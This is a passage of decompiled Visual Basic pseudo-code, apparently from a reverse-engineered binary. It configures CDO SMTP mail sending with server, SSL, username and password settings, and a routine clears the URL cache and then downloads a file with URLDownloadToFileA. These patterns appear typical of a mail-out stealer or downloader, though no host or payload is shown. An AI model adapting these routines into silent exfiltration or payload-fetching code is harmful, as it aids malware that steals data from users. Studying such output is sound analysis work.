  var_80 = "http://schemas.microsoft.com/cdo/configuration/" & "smtpserver"
  If var_30 Then
    If var_30 = 1 Then
      var_44 = var_44 - ecx+00000014h
      var_D0 = var_44
      If var_44 >= 0 Then
        var_eax = Err.Raise
      End If
      GoTo loc_0041DCCC
    End If
  End If
  var_eax = Err.Raise
  loc_0041DCCC: 
  Set 1 & var_68 = var_40."Configuration".1
  call __vbaVarLateMemCallSt(var_98, var_88, var_84, var_80, var_7C)
  var_88 = Split(global_0042C088, &H407CCC, -1, 0)
  var_30 = var_88
  var_80 = "http://schemas.microsoft.com/cdo/configuration/" & "smtpserverport"
  If var_30 Then
    If var_30 = 1 Then
      var_44 = var_44 - ecx+00000014h
      var_D0 = var_44
      If var_44 >= 0 Then
        var_eax = Err.Raise
      End If
      GoTo loc_0041DE3E
    End If
  End If
  var_eax = Err.Raise
  loc_0041DE3E: 
  Set 1 & var_68 = var_40."Configuration".1
  call __vbaVarLateMemCallSt(var_98, var_88, var_84, var_80, var_7C)
  var_80 = "http://schemas.microsoft.com/cdo/configuration/" & "smtpconnectiontimeout"
  Set 1 & var_68 = var_40."Configuration".1
  call __vbaVarLateMemCallSt(var_98, 00000008h, var_84, "http://schemas.microsoft.com/cdo/configuration/" & "smtpconnectiontimeout", var_7C)
  var_88 = Split(global_0042C08C, &H407CCC, -1, 0)
  var_30 = var_88
  var_80 = "http://schemas.microsoft.com/cdo/configuration/" & "smtpusessl"
  If var_30 Then
    If var_30 = 1 Then
      var_44 = var_44 - ecx+00000014h
      var_D0 = var_44
      If var_44 >= 0 Then
        var_eax = Err.Raise
      End If
      GoTo loc_0041E058
    End If
  End If
  var_eax = Err.Raise
  loc_0041E058: 
  Set 1 & var_68 = var_40."Configuration".1
  call __vbaVarLateMemCallSt(var_98, var_88, var_84, var_80, var_7C)
  If arg_10 Then
    var_80 = "http://schemas.microsoft.com/cdo/configuration/" & "smtpauthenticate"
    Set var_78 = var_40."Configuration"
    Set 1 & var_68 = var_78.1
    call __vbaVarLateMemCallSt(var_78, 00000008h, var_84, "http://schemas.microsoft.com/cdo/configuration/" & "smtpauthenticate", var_7C)
    GoTo loc_0041E5E7
  End If
  var_88 = Split(global_0042C090, var_78, -1, 0)
  var_30 = var_88
  var_80 = stk@1006C("smtpauthenticate", "http://schemas.microsoft.com/cdo/configuration/", var_78, var_88, var_98)
  If var_30 Then
    If var_30 = 1 Then
      var_44 = var_44 - ecx+00000014h
      var_D0 = var_44
      If var_44 >= 0 Then
        var_eax = Err.Raise
      End If
      GoTo loc_0041E27A
    End If
  End If
  var_eax = Err.Raise
  loc_0041E27A: 
  Set 1 & var_68 = var_40."Configuration".1
  call __vbaVarLateMemCallSt(var_98, var_88, var_84, var_80, var_7C)
  var_88 = Split(global_0042C094, &H407CCC, -1, 0)
  var_30 = var_88
  var_80 = stk@1006C("sendusername", "http://schemas.microsoft.com/cdo/configuration/")
  If var_30 Then
    If var_30 = 1 Then
      var_44 = var_44 - ecx+00000014h
      var_D0 = var_44
      If var_44 >= 0 Then
        var_eax = Err.Raise
      End If
      GoTo loc_0041E3EC
    End If
  End If
  var_eax = Err.Raise
  loc_0041E3EC: 
  Set 1 & var_68 = var_40."Configuration".1
  call __vbaVarLateMemCallSt(var_98, var_88, var_84, var_80, var_7C)
  var_88 = Split(global_0042C098, &H407CCC, -1, 0)
  var_30 = var_88
  var_80 = stk@1006C("sendpassword", "http://schemas.microsoft.com/cdo/configuration/")
  If var_30 Then
    If var_30 = 1 Then
      var_44 = var_44 - ecx+00000014h
      If var_44 >= 0 Then
        var_eax = Err.Raise
      End If
      GoTo loc_0041E556
    End If
  End If
  var_eax = Err.Raise
  loc_0041E556: 
  Set 1 & var_68 = var_40."Configuration".1
  call __vbaVarLateMemCallSt(var_98, var_88, var_84, var_80, var_7C)
  loc_0041E5E7: 
  Set 1 & var_68 = var_40."Configuration".0
  1 & var_68 = Me.
  var_40 = Me.send
  call __vbaVarSetObjAddref(var_40, 00000000h)
  call __vbaVarSetObjAddref(var_2C, 00000000h)
  Exit Sub
  GoTo loc_0041E6E9
  call __vbaVarSetObjAddref(var_40, 00000000h, global_0041E706)
  call __vbaVarSetObjAddref(var_2C, 00000000h)
  Exit Sub
  GoTo loc_0041E6E9
  Exit Sub
  loc_0041E6E9: 
  Exit Sub
End Sub

Public Sub Proc_2_24_41E730
  On Error Resume Next
  var_eax = DeleteUrlCacheEntryA(arg_8, FFFFFFFFh, edi)
  var_ret_2 = var_2C
  var_ret_3 = arg_C
  var_ret_4 = arg_8
  var_eax = URLDownloadToFileA(00000000h, var_ret_4, var_ret_3, 00000000h)
  var_ret_5 = var_2C
  var_ret_6 = var_30
  var_24 = URLDownloadToFileA(00000000h, var_ret_4, var_ret_3, 00000000h)
  If var_24 = 0 Then
  End If
  GoTo loc_0041E865
  Exit Sub
  loc_0041E865: 
End Sub
